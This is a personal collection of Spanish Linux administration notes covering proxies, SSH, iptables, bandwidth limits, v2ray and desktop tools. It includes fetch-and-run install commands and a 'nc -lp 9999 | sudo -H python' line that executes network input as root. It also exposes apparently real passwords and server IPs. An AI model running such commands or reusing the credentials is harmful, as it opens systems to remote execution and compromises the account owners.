Al reiniciar el equipo, el sistema utilizará automáticamente la configuración de proxy.
reboot

Si no desea reiniciar el equipo, utilice el comando source para habilitar la configuración de proxy.
source /etc/profile.d/proxy.conf

¡Felicitaciones! Ha configurado la autenticación de proxy de Ubuntu correctamente.


#### Para utilizar git desde la terminal con proxy con autenticación

Comando para utilizar:

git config --global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080

    cambia proxyuser a tu usuario proxy
    cambie proxypwd a su contraseña de proxy
    cambie proxy.server.com a la URL de su servidor proxy
    cambie 8080 al puerto proxy configurado en su servidor proxy

git config --global http.proxy http://proxyuser:proxypwd@proxy.server.com:8080
#### Con credenciales
git config --global http.proxy http://usu:usu@192.168.43.1:44355
git config --global https.proxy http://usu:usu@192.168.43.1:44355
#### Sin credenciales
git config --global http.proxy http://192.168.43.1:44355
git config --global https.proxy http://192.168.43.1:44355


#### Finalmente, para verificar el proxy actualmente configurado:
git config --global --get http.proxy
git config --global --get https.proxy

#### restablecer este proxy y trabajar sin proxy:
git config --global --unset http.proxy
git config --global --unset https.proxy

#### Errores Comunes
    502: URL/IP is unreachable from your network.
    407: Proxy authentication Denied.
    80 : Proxy has not been set properly.

#### Configuración de proxy para wget:
– Editamos el archivo de configuración /etc/wgetrc buscamos las siguientes lineas
sudo nano /etc/wgetrc
use_proxy=yes
use_proxy=off

https_proxy = http://proxyserver:puerto/
http_proxy = http://proxyserver:puerto/
ftp_proxy = http://proxyserver:puerto/
	
https_proxy = http://192.168.43.1:44355/
http_proxy = http://192.168.43.1:44355/
ftp_proxy = http://192.168.43.1:44355/


#### Configuracion de proxy en la terminal

sudo nano /etc/environment

http_proxy http://usu:usu@192.168.43.1:44355
https_proxy http://usu:usu@192.168.43.1:44355
ftp_proxy http://usu:usu@192.168.43.1:44355
no_proxy localhost,127.0.0.1,localaddress,.localdomain.com
#Duplicadas en mayusculas
HTTP_PROXY http://usu:usu@192.168.43.1:44355
HTTPS_PROXY http://usu:usu@192.168.43.1:44355
FTP_PROXY http://usu:usu@192.168.43.1:44355
NO_PROXY localhost,127.0.0.1,localaddress,.localdomain.com

otro formato

export http_proxy=http://usu:usu@192.168.43.1:44355
export https_proxy=http://usu:usu@192.168.43.1:44355
export ftp_proxy=http://usu:usu@192.168.43.1:44355
export no_proxy=localhost,127.0.0.1,localaddress,.localdomain.com
export #Duplicadas=en mayusculas
export HTTP_PROXY=http://usu:usu@192.168.43.1:44355
export HTTPS_PROXY=http://usu:usu@192.168.43.1:44355
export FTP_PROXY=http://usu:usu@192.168.43.1:44355
export NO_PROXY=localhost,127.0.0.1,localaddress,.localdomain.com


#### Configuración de proxy para apt-get, apt, aptitude:
– Creamos o editamos archivo /etc/apt/apt.conf
sudo nano /etc/apt/apt.conf

– agregamos las siguientes lineas:
Acquire::http::Proxy "http://usu:usu@192.168.43.1:44355"; 
Acquire::https::Proxy "http://usu:usu@192.168.43.1:44355"; 
Acquire::ftp::Proxy "http://usu:usu@192.168.43.1:44355";
#En caso de tener un repo local para el que no necesitemos proxy 
Acquire::http::Proxy {
repositorio.localdomain.com DIRECT;
repositorio2.localdomain.com DIRECT;
};


### Cambiar password root

    Abre la Terminal (Control + Alt + T)
    Teclea (sin comillas) "sudo su"
    Introduce tu clave actual
    Teclea "passwd root" y escribe tu nueva clave
    Pulsa enter y cierra la terminal

### Modificar puerto para conectar por SSH

Edite el archivo sudo nano /etc/ssh/sshd_config utilizando su editor de textos favorito.
service ssh restart

### uso de targz

para descomprimir
tar -xzvf archivo.tar.gz

para comprimir un directorio 
tar -cvf sampleArchive.tar /home/sampleArchive

### Liberar memoria ram sin reiniciar
Antes que nada, para saber cuánta memoria está en uso, cuánta está libre y cuánta está guardada en el caché ejecutamos el comando:
free -m

Para ver el uso en tiempo real utilizamos:
watch -n 1 free -m

-
Para vaciar la memoria en si:
sudo sync && sudo sysctl -w vm.drop_caches=3


### Speetest desde consola (en la página de speedtest.net hay uno mas completo)
https://blog.desdelinux.net/como-ejecutar-una-prueba-de-velocidad-de-internet-desde-la-terminal/
instalalar:
sudo apt install speedtest-cli
pip install speedtest-cli
Para ejecutar:
speedtest-cli

 
#### Modificar Prompt
nano .bashrc
export PS1="Texto> "
source ~/.bashrc

 
#### Como conectar por ssh sin tener que ingresar la clave todas las veces
https://blog.desdelinux.net/ssh-sin-password-solo-3-pasos/

ssh-copy-id root@[ip-destino]
ssh-copy-id root@200.73.128.64
ssh-copy-id root@200.73.130.205
ssh-copy-id root@54.159.130.144
ssh-copy-id root@45.236.128.172
ssh-copy-id root@200.73.129.196
ssh-copy-id root02@20.80.89.33
ssh-copy-id root02@20.80.89.33
ssh-copy-id ubuntu@51.222.84.152
ssh-copy-id root@200.73.133.192
ssh-copy-id root@200.73.133.216
 
#### Comprobando quién está conectado por SSH en un sistema UNIX/Linux
https://www.elarraydejota.com/comprobando-quien-esta-conectado-por-ssh-en-un-sistema-unixlinux/

ps -ef | grep -w "sshd."
ps -ef | grep -w "sshd.*? priv"
ps -ef | grep -w "sshd.*? priv"

#### Cómo habilitar TCP BBR para mejorar la velocidad de la red en Linux
https://translate.google.com/translate?depth=1&hl=es-AR&rurl=translate.google.com&sl=en&tl=es&u=https://www.techrepublic.com/article/how-to-enable-tcp-bbr-to-improve-network-speed-on-linux/

Var que version de kernel tiene
uname -r
Si es 4.13 o mayor solo es necesario habilitar la opcin de bbr

Saber que tipo de control de congestion está usando
sysctl net.ipv4.tcp_congestion_control 
si no se encuentra en el path el comando:
/sbin/sysctl net.ipv4.tcp_congestion_control

Establecer BBR
Establecer BBR como predeterminado es simple. Abra una ventana de terminal y emita el comando sudo nano /etc/sysctl.conf . Al final de este archivo, agregue las dos líneas siguientes:

net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr


### IP Tables

 Consultar reglas disponibles
iptables -L -n -v


-- Borrar todas las regas
iptables -F

 Consultar pedicione rechazadas
iptables -N LOGGING

Bloquear porASN

ASN=15169; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo "Bloqueando $s"; sudo iptables -A INPUT -s $s -j DROP &> /dev/null || sudo ip6tables -A INPUT -s $s -j DROP; done

ASN=32934; for s in $(whois -H -h riswhois.ripe.net -- -F -K -i $ASN | grep -v "^$" | grep -v "^%" | awk '{ print $2 }' ); do echo  "Bloqueando $s"; sudo iptables -A INPUT -s $s -j DROP &> /dev/null || sudo ip6tables -A INPUT -s $s -j DROP; done

iptables -A INPUT -s 8.8.4.0/24 -j ACCEPT
iptables -A INPUT -s 8.8.8.0/24 -j ACCEPT

iptables -D INPUT -s 8.8.4.0/24 -j DROP
iptables -D INPUT -s 8.8.8.0/24 -j DROP


Listar todas las ip de un AS
whois -H -h riswhois.ripe.net -- -F -K -i 13335 | grep -v "^$" | grep -v "^%" | awk '{ print $2 }'

El ASN lo obtuve de esta url
https://www.rtsak.com/dns-lookup/personal.com.ar

A continuación tenéis algunos ASN de las empresas más populares:

    Google: AS15169
    Facebook: AS32934
    Microsoft: AS8075
    Yahoo: AS10310
    Telecom: AS7303
    CloudFlare: AS13335

...
    –Bloquear el primer rango
    199.30.231.0/24 255 ips bloqueadas

    –Bloquear los dos primeros rangos
    199.30.0.0/16 65536 ips bloqueadas

    –Bloquear los tres primeros rangos
    199.0.0.0/8 16777216 ips serían bloqueadas

calculadorea de ip
https://aprendaredes.com/cgi-bin/ipcalc/ipcalc_cgi1?host=104.18.0.0&mask1=20&mask2=
Esquema de direcciones ip
https://docs.oracle.com/cd/E19957-01/820-2981/ipplan-5/index.html


para conocer la ip de youtube
ping youtube-ui.l.google.com
iptables -A INPUT -s 172.217.0.0/16 -j DROP


limitar trafico por ip 
iptables -A FORWARD -m hashlimit –hashlimit-burst 1mb –hashlimit-mode srcip, dstip –hashlimit-name bwlimit -j DROP 

otro ejemplo
iptables -I INPUT -p tcp -m tcp –dport 8080 -m hashlimit –hashlimit-upto 40/sec –hashlimit-burst 40 –hashlimit-mode srcip –hashlimit-name HTTP_RATE -j ACCEPT
iptables -I INPUT -p tcp -m tcp –dport 8080 -j DROP

otro ejemplo
sudo iptables --flush  # start again
sudo iptables --new-chain RATE-LIMIT
sudo iptables --append INPUT --match conntrack --ctstate NEW --jump RATE-LIMIT
sudo iptables --append RATE-LIMIT --match limit --limit 10/sec --limit-burst 10 --jump ACCEPT
sudo iptables --append RATE-LIMIT --jump DROP

otro ejemplo
sudo iptables -A INPUT -m state --state RELATED,ESTABLISHED -m limit --limit 50/second --limit-burst 50 -j ACCEPT
sudo iptables -A INPUT -m state --state RELATED,ESTABLISHED -m limit --limit 10/second --limit-burst 10 -j ACCEPT

otro ejemplo
iptables -A FORWARD -m hashlimit --hashlimit-upto 512kb/sec --hashlimit-burst 1mb --hashlimit-mode srcip,dstip --hashlimit-name bwlimit -j DROP


### monitor de red 
iftop
iptraf
nethogs
tcptrack -i eth0
cbm

Server Brasil-3
speedometer -r lo -t eth0 -s
time speedometer -t lo -s -l -m 9900000

Transmite el server Fiber
time speedometer -t lo -s -l -m 6500000

Transmite server USA
speedometer -t lo -s -l -m 2000000

 recibe por wifi interna
time speedometer -r wlp1s0 -s -l -m 50000
time slurm -s -z -i wlp1s0
 recibe por wifi externa
time speedometer -r wlx20e01704b3f0 -s -l -m 3000000
time slurm -s -z -i wlx20e01704b3f0

time speedometer -t lo -s -l -m 8000000

### PulseEffects (Un muy buen manejador de audio)
http://ubuntuhandbook.org/index.php/2019/06/install-audio-effects-pulseeffects-ubuntu-18-04-higher/

 

148.153.108.54                             
186.12.44.38                               
222.186.52.39                              
dns.google                                 
149.154.175.54                             
140.243.190.35.bc.googleusercontent.com    
b1.b5.39a9.ip4.static.sl-reverse.com       
54.c5.39a9.ip4.static.sl-reverse.com       
87.251.74.45                               
45.236.213.131                             
srv2.gyllen.cl                             


Usuario:     21735582@isfd30.onmicrosoft.com

Contraseña:    Quh91455


Las credenciales para la plataforma microsoft las solicité en la plataforma del profesorado en:
Aulas / Aula_Alumnos Electromecánica
Mensajería interna.
Botón redactar.
Luego en el botón para, seleccioné a Alicia Campana porque ya me habia enviado algun mensaje anteriormente.
Y me respondió con el usuario y contraseña
Donde el usuario tiene el formato.
usuario@isfd30.onmicrosoft.com
y usario es mi nro de documento.

La url para ingresar es:
https://login.microsoftonline.com/

Luego pide validar un teléfono y un correo electrónico.
Me parece que es para poder recuperar contraseña, si fuera necesario en el futuro.

Tal vez quedó muy maestra ciruela, pero sin saber a quien solicitar las credenciales, no podía avanzar.


### Entrar a Amazon con archivo .pem de claves
El archivo debe ser de solo lectura
chmod 400 archivo.pem

para ingesar
ssh -i $HOME/Descargas/VPS/joriza-br2.pem ubuntu@177.71.227.243
ssh -i $HOME/Descargas/VPS/joriza-br3.pem ubuntu@54.232.42.191


### Cómo mantener vivas las conexiones SSH

sudo nano /etc/ssh/sshd_config

ClientAliveInterval 600
ClientAliveCountMax 3
ServerAliveInterval 600
TCPKeepAlive yes


### Limitar la velocidad de la placa de red

sudo apt install wondershaper
cd /bin
sudo git clone https://github.com/magnific0/wondershaper.git
cd wondershaper
sudo make install

sudo wondershaper clear wlp1s0  


wondershaper -a lo -u 15360
wondershaper -ca lo

wondershaper -ca lo | wondershaper -a lo -u 35000

 
cd /bin/wondershaper
./wondershaper -a lo -u 8192
./wondershaper -a lo -d 4096
./wondershaper -ca lo


### Como top pero para red
nethogs


### Copiar archivos por SSH 
http://mundo.openit.com.bo/?p=1639

cp /root/client.ovpn /home/ubuntu

scp ubuntu@45.156.25.208:/home/ubuntu/client.ovpn /home/javier/Descargas



### Configurar una maquina como proxy socks
ssh -D 9999 root@200.73.128.12
En la maquina que lo va a utilizar, en proxy socks colocar:
localhost Port:9999


### Termius
Termius
Pitufo0$Pitufo0



### Como instalar un archivo .deb facilmente
ejemplo de una descarga
wget https://www.unifiedremote.com/static/builds/server/linux-x64/745/urserver-3.6.0.745.deb

Se instala con:
sudo dpkg -i archivo*.deb

Si tienen problemas con las dependencias las solucionan con:
sudo apt-get install -f

Para desinstalar:
sudo apt-get remove archivo.deb


### Celular como Mouse Pad

#### Linux Remote Control
Aplicación de solo 1Mb
https://play.google.com/store/apps/details?id=com.matze.remotecontrol

Ejecutar el siguiente comando en la computadora:
nc -lp 9999 | sudo -H python

Abrir el menú en la aplicación y elija "Agregar host".
Elija un apodo gratis por su elección y proporcione la dirección IP de su computadora.

#### Home Remote Control
https://play.google.com/store/apps/details?id=com.inspiredandroid.linuxcontrolcenter&hl=es

El servidor en un archivo .jar asi que funciona multiplataforma
se descarga de:
http://schubert-simon.de/remotecontrolserver/RemoteControlServer.zip
En algunas distribuciones basta con hacer doble click al archivo .jar, en otras se debe ejecutar:
java -jar RemoteDroidServer.jar 

#### Unifiedremote (Telefono cono mando remoto de la Pc)
https://play.google.com/store/apps/details?id=com.Relmtech.Remote

Para instalar en la PC
wget https://www.unifiedremote.com/static/builds/server/linux-x64/745/urserver-3.6.0.745.deb
sudo dpkg -i urserver*.deb



### Atajos de teclado

Vamos a ver una serie de atajos de teclado que nos ayudan a ganar agilidad, versatilidad y a trabajar más cómodamente con la terminal y con la línea de comandos en general.

    TAB: El tabulador permite autocompletar lo que se está escribiendo o navegar entre posibles opciones.
    CTRL + C: Sirve para matar un proceso que se esté ejecutando.
    CTRL + Z: Sirve para enviar al segundo plano el proceso que se está ejecutando. Si queremos volver al mismo, bastará con usar el comando fg.
    CTRL + D: Es el equivalente al comando exit, que sirve para cerrar la sesión de un usuario.
    CTRL + L: Este es el equivalente al comando clear y sirve para limpiar la pantalla de terminal. Es bastante útil, sobre todo cuando se ejecuta algún otro software de línea de comandos que no tiene un comando para limpiar pantalla y no se puede insertar el comando clear, como por ejemplo al utilizar el terminal de MySQL.
    CTRL + A: Mueve el cursor al inicio. Es útil si estamos escribiendo un comando largo y queremos corregir algo del inicio.
    CTRL + E: Mueve el cursor al final. De utilidad si queremos añadir algo al final del comando de forma rápida.
    CTRL + U: Con este atajo se borra la línea entera, independientemente de donde esté el cursor.
    CTRL + K: De esta forma conseguimos borrar desde la posición del cursor hasta el final de la línea.
    CTRL + W: Sirve para borrar la palabra que esté justo antes del cursor, o bien borra todas las letras desde la posición en la que está el mismo hasta el inicio de la palabra anterior.
    CTRL + Y: Permite deshacer el último borrado que se ha realizado.
    CTRL + R: Permite buscar dentro del historial de comandos que se han introducido. Es útil en caso de no recordar un comando que se ha introducido o uno que sea excesivamente largo, así se puede recuperar sin tener que volver a escribirlo. Cada vez que se pulsa CTRL + R la búsqueda va un paso más atrás.
    CTRL + G: Para salir de la búsqueda.
    CTRL + SHIFT + C: Sirve para copiar texto seleccionado en la terminal.
    CTRL + SHIFT + V: Permite pegar el texto copiado en la terminal.
    CTRL + S: De esta forma podemos pausar lo que se está imprimiendo por pantalla. Es útil para poder leer algo del texto que aparece durante una instalación, por ejemplo.
    CTRL + Q: Para reanudar la impresión por pantalla que se había pausado.


### Reloj en la terminal de comandos

#### sin instalar nada.
Reloj arriba a la derecha mientras la terminal esté abierta
while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &

#### Reloj grande en el centro de la pantalla
tty-clock -s -x -b -c

para instalar
Pueden ser necesarias las siguientes librerías.
sudo apt-get install libncurses5-dev libncursesw5-dev

### tmux (multiples ventanas como terminator, parecido a screen)
algunas paginas que ayudan con la configuración
https://learnxinyminutes.com/docs/es-es/tmux/
https://wiki.archlinux.org/index.php/Tmux_(Espa%C3%B1ol)
https://gist.github.com/jesusangelm/8113117
https://picodotdev.github.io/blog-bitix/2019/10/guia-de-inicio-del-gestor-de-terminales-y-sesiones-tmux/
https://leanpub.com/the-tao-of-tmux/read


### pomodoro para linux
https://gnomepomodoro.org/
sudo apt-get install gnome-shell-pomodoro


### Borrar archivos de más de x días de antigüedad
find $HOME/terrier-spanish/Users/jorge/test_results/*.txt* -mtime +90 -exec rm {} \;
https://www.edubox.org/linux-script-borrar-backup-viejos/


### Calculadora IP
https://www.aprendaredes.com/blog/calculadora-ip/


mi ip en microlan 6/10 15hs
 190.181.100.190

ip de microlan
181.23.37.80

### Quitar lineas duplicadas
cat Origen.txt | sort | uniq > Destino.txt

#### Abrir otra terminal desde la propia terminal
Ejecutar desde la linea de comando
gnome-terminal

#### Apagar linux desde consola
https://soyprogramador.liz.mx/2015/12/07/apagar-linux-desde-consola-2

halt, poweroff y shutdown son los comandos con los que podremos apagar nuestro linux dese consola, siendo shutdown el que mas opciones nos brinda. y para reiniciar tenemos reboot.

$ sudo poweroff

Con shutdown ademas de apagar el equipo, podemos especificar la hora exacta o bien dentro de cuanto tiempo se debera a pagar nuestro sistema, por ejemplo:

Para que se apague inmediatamente

$ sudo shutdown -h now

En 10 minutos:

$ sudo shutdown -h +10


#### Apagar y reiniciar mediante comandos
https://blog.desdelinux.net/apagar-y-reiniciar-mediante-comandos/


#### Tomar notas en Linux, similar a OneNote
Xournal 
http://www.estrellateyarde.org/ofimatica/tomar-notas-en-linux


#### Controlar el volumen del audio y del sonido desde la terminal
https://www.linuxparty.es/41-musica/10275-administrar-el-sonido-y-audio-desde-consola-linux.html
alsamixer

Para configurar el volumen maestro use:

    # Obtiene una lista de controles simples de mezclador 
    $ amixer scontrols 

Luego ajústelo al volumen deseado, como ejemplo

    amixer sset 'Master' 50%

Algunos ejemplos más:

    # Aumenta un 3%
    amixer -q sset Master 3%+

    # Disminución en un 3%
    amixer -q sset Master 3%-

    # Activar / desactivar (Mute)
    amixer -q sset Master toggle



#### ¿Cómo escuchar mi voz en altavoces con micrófono?
https://qastack.mx/ubuntu/123798/how-to-hear-my-voice-in-speakers-with-a-mic

Extension para Gnome: PulseAudio Loopback Device
https://extensions.gnome.org/extension/954/pulseaudio-loopback-device/

    Primero instale PulseAudio Volume Control / pavucontrol.

    Instale a través del Administrador de software.

    O ejecute este comando a continuación en la terminal:

    sudo apt-get install pavucontrol

    Para iniciar el funcionamiento del micrófono al altavoz, ejecute el siguiente comando en la terminal.

    pactl load-module module-loopback latency_msec=1

    Para detener lo mismo, ejecute el siguiente comando en la terminal.

    pactl unload-module $(pactl list short modules | awk '$2 =="module-loopback" { print $1 }' - )



#### Tipo webstripper (Spider)
https://www.linux-magazine.com/Online/Features/WebHTTrack-Website-Copier
sudo apt-get install httrack webhttrack


#### Proxy OffLine
http://proxy-offline-browser.com/private/Description.html
https://proxy-offline-browser.com/private/Download.html
/home/javier/Descargas/temp/MM3-WebAssistantPrivate/MM3-WebAssistant.jar 


#### Ver especificaciones completas de un PC
sudo lshw

#### Generador de sonidos
https://qastack.mx/unix/82112/stereo-tone-generator-for-linux

##### Pequeñas variantes del anterior
https://www.it-swarm-es.com/es/audio/estereo-generador-de-tonos-para-linux/956744204/

##### Variante con ffmpeg
https://ffmpeg.org/ffmpeg-filters.html#anoisesrc
ffplay -f lavfi -i "anoisesrc=d=60:c=pink:r=44100:a=0.5" -autoexit -nodisp
Specify the color of noise. Available noise colors are white, pink, brown, blue, violet and velvet. Default color is white. 

##### Generador de sonidos otro
sudo apt-get install sox
play -n synth 60:00 whitenoise
play -n synth 60:00 pinknoise
play -n synth 60:00 brownnoise


#### ZSH un sheel de Linux muy amigable
https://geekytheory.com/como-instalar-oh-my-zsh-en-ubuntu
https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins/git


Pasos para instalar Oh My ZSH
1. Instalar ZSH y git-core
sudo apt-get install zsh
sudo apt-get install git-core
2. Descargar el instalador de Oh My ZSH y ejecutarlo
wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | zsh
3. Cambiar el shell a ZSH
chsh -s `which zsh`
4. Reiniciar la consola y/o el equipo


Cambiar a bash:
exec bash
Cambiar a zsh:
exec zsh

bash como predeterminado
chsh -s /bin/bash
zsh como predeterminado
chsh -s /bin/zsh

## Descarga imagenes ISO Ubuntu
https://releases.ubuntu.com/18.04/ubuntu-18.04.5-live-server-amd64.iso
https://releases.ubuntu.com/
## Proxy Netflix
https://github.com/ab77/netflix-proxy
## Un para de datos de DNS
https://coredns.io/manual/toc/
https://www.v2ray.com/en/configuration/dns.html
## Tipo iptv gratis
https://spliktv.web.app/
## Doncker online
https://labs.play-with-docker.com/

## v2ray Zeta

sudo apt update
sudo apt upgrade
#no es necesario reiniciar
wget https://raw.githubusercontent.com/zeta-sys/instv2rayzeta/main/v2rayzeta.sh && chmod 777 v2rayzeta.sh && ./v2rayzeta.sh
wget https://raw.githubusercontent.com/zeta-sys/instv2rayzeta/main/zetav2ray2.sh && chmod 777 zetav2ray2.sh && ./zetav2ray2.sh

Al instalar crea una configuración x defecto
### Cambiar protocolo a websocket
3.ADM. CONFIG.
    5.CAMBIAR PROTOCOLO
        3.WebSocket
        en dominio falso: subdominio

### Cambiar puerto a 80
3.ADM. CONFIG.
    4.CAMBIAR PUERTO
        80 (Enter)

### Crear usuario
2.ADM. CLIENTES
    1.AGREGAR USUARIO
    Enter para que coloque un email falso utomaticamente.

### Copiar vmes
4.VER INFO CLIENTES
    El nro. de cliente mas grande es el último creado
    



verificar si guardó ip
cat /etc/resolv.conf


TLS no se toca, queda cerrado, aveces es necesario abrirlo, pero en general queda cerrado.
Cerrado
Probar
Abrile el tcpfastopen
Eso lo acelera
Para desactivarlo opcion CERRAR

sudo /etc/init.d/networking restart


para que no reinice la conf 
sudo apt update
sudo apt install resolvconf
.
sudo systemctl status resolvconf.service


sudo systemctl enable resolvconf.service 
sudo systemctl start resolvconf.service 
sudo systemctl status resolvconf.service


....................................

#instalar programa necesario para activar DNS
sudo apt update
sudo apt install resolvconf
sudo systemctl status

#Si no esta activado resolvconf.service
#reinciar servicios con:
sudo systemctl enable resolvconf.service 
sudo systemctl start resolvconf.service 
sudo systemctl status resolvconf.service

#editar a mano archivo de configuración
sudo nano /etc/resolvconf/resolv.conf.d/head
#colocar
nameserver 190.114.255.193
#salir grabando
#para actualizar archivo configuración esclavo
sudo resolvconf --enable-updates
sudo resolvconf -u
#Revisa si figura la dns q pusimos
sudo cat /etc/resolv.conf

-------------------


creo que aunque duela.
rehacer en este orden
Rebuild con ubuntu 20
instalar kalix
instalar v2ray
configurar v2ray
configurar kalix
configurar dns kalix
configurar dns con los comandos

## Mikrotik Monetizable
Mikrotik configurar conexiones como si fueran clientes  
https://www.youtube.com/watch?v=4rY--Wali-s  

Descargar Router OS  
https://mikrotik.com/download  

instalar Winbox bajo Linux  
https://www.dagorret.com.ar/instalar-winbox-linux-ubuntu-fedora-mint-entro-otros/  

Cómo configurar MikroTik RouterOS para compartir el acceso a Internet  
https://www.raulprietofernandez.net/blog/mikrotik/como-configurar-mikrotik-routeros-para-compartir-el-acceso-a-internet  

Un ejemplo de negocio monetizado  
http://www.hotspotsystem.com/es/installation-guide-mikrotik-manual  

Alernativa gratis a Mikrotik
pfSense o Mikrotik: ¿Cual elegir?
https://clouding.io/kb/pfsense-o-mikrotik/

Seguridad inicial para mikrotik como isp
https://www.youtube.com/watch?time_continue=7&v=_9wARwQMA50&feature=emb_logo  

Como ser un WISP  
https://www.youtube.com/watch?v=Nt0AB582G1I  

1MB de trafico internacional cuesta 10USD

Video 45min para configurar mikrotik
https://configurarmikrotikwireless.com/video1-45-mins  

Tipo buenos aires libre con mikrotik  
http://tombatossals.github.io/taller-nodos-hibridos/#1  



## Extraer audio de un video
Con el programa mplayer
sudo apt-get install mplayer mplayer-gui mplayer-skins
https://www.adslfaqs.com/como-instalar-mplayer-en-ubuntu-linux-con-codecs-y-soporte-de-dvd/
http://www1.mplayerhq.hu/design7/news-es.html

### Controlando mplayer
https://linsolitic.wordpress.com/2017/03/10/controlando-mplayer/

### Convertir con mplayer pero no siempre me funciona
mplayer -vo null -dumpaudio -dumpfile archivo.mp3 basshunter_saturday.mkv
otra forma. No sé cual será la mejor
mplayer -dumpaudio Archivo_video.flv -dumpfile Archivo_audio.mp3
### Convertir con otro
ffmpeg -i video -f mp3 audio.mp3
https://ugeek.github.io/blog/post/2019-09-30-extraer-audio-de-un-v%C3%ADdeo-con-ffmpeg.html

### Reproduciendo con mpv
Tiene la opcion de no mostrar el video en un archivo de video.
mpv --no-video ~/Música/
https://mpv.io/

### Pipenv: gestor de entornos virtuales de Python 
https://jarroba.com/pipenv-gestor-de-entornos-virtuales-de-python/

### [MAS DE 30 COMANDOS en LINUX para manejar tu SERVER!](https://www.youtube.com/watch?v=0BA4k3jweaE)




## latinCloud
Por que me dices que puede ser un problema con la clave? Si como muesta la captura, ni siquiera me llega a pedir la clave.
Mandale Rebuild, desde que contraté el sercicio, en 4 dias solo he podido ejecutar 3 o 4 comandos.
Si tuvieran Rebuild en el panel la situación hubiera sido mas ágil. No pierdo nada con un rebuild.


Waiting for cache lock: Could not get lock /var/lib/dpkg/lock-frontend. It is held by process 1256 (apt-get)... 103s

Last login: Thu May 27 22:31:31 2021 from 45.239.34.33
root@60abbab048545:~# apt update
Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]
Hit:2 http://us.archive.ubuntu.com/ubuntu focal InRelease
Hit:3 http://us.archive.ubuntu.com/ubuntu focal-updates InRelease
Get:4 http://us.archive.ubuntu.com/ubuntu focal-backports InRelease [101 kB]
Fetched 214 kB in 1s (163 kB/s)                                    
Reading package lists... Done
Building dependency tree       
Reading state information... Done
7 packages can be upgraded. Run 'apt list --upgradable' to see them.
root@60abbab048545:~# apt upgrade
E: dpkg was interrupted, you must manually run 'dpkg --configure -a' to correct the problem. 

Buenas tardes.
Estoy instalando una aplicación que en un momento que debe validar externamete, y no continúa.
Consultando al soporte de dicha aplicación me indican que debe estar abierto el puerto 81 TCP.
Paso captura de mi verificación en el VPS. El puerto 81 se muestra como abierto.
Uds tiene alguna restricción del puerto 81? 
Como puedo habilitarlo?
Saludos.


### IPTV para Linux
SMPlayer
sudo apt install smplayer


### Error de certificado SSL en Python
I had a similar problem on one of my Linux machines. Generating fresh certificates and exporting an environment variable pointing to the certificates directory fixed it:

$ sudo update-ca-certificates --fresh
$ export SSL_CERT_DIR=/etc/ssl/certs
